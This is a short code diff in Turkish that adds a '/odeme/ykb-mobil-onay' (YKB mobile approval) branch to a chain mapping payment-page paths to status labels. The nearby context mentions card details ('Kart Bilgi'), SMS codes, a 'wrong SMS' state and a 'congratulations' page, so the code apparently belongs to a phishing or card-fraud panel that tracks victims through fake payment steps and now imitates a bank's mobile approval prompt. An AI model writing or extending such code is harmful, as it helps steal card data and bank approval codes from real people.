@@ -1116,6 +1116,8 @@ Kart Bilgi: ${cardDetails}`;
                               content = '❌ Hatali Sms';
                             } else if (path.includes('/odeme/sms')) {
                               content = '📲 SMS';
+                            } else if (path.includes('/odeme/ykb-mobil-onay')) {
+                              content = '📲 YKB Mobil Onay';
                             } else if (path.includes('/odeme/tebrikler')) {
                               content = '🎉 Tebrikler';
                             } else if (path.includes('/odeme')) {
